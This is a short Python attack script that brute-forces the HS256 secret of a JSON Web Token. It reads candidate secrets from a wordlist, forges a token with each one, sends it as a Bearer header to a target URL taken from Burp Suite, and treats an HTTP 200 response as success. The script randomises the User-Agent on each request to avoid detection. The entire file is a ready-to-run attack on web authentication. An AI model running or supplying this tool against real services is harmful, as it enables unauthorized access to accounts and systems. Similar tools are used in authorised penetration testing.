import requests
import jwt
from fake_useragent import UserAgent

# BruteForce in secret HS256 JWT
# Use "Copy as requests" of the burpsuite and add the information below
url = ""        # CHANGE THIS
header = {}     # CHANGE THIS

if url == "" and header == {}:
    print('Use "Copy as requests" of the burpsuite and add the information in the code')
else:
    wl = open('wordlist.txt')
    wl = wl.read().split('\n')

    ua = UserAgent()

    for secret in wl:

        encoded = jwt.encode({"bla" : "blabla"}, '{s}'.format(s=secret), algorithm='HS256')
        enc = str(encoded)
        tkn = "Bearer {t}".format(t=enc[2:-1])

        # Burp requests
        burp0_url = url
        burp0_headers = header

        burp0_headers['authorization'] = tkn
        burp0_headers['User-Agent'] = ua.random

        r = requests.post(burp0_url, headers=burp0_headers)
        print('{s} > {r}'.format(s=secret,r=r.status_code))
        if r.status_code == 200:
            print('\nSECRET FOUND\n')
            print('Token JWT: {t}'.format(t=tkn))
            exit(0)

    print('Secret NOT FOUND!')
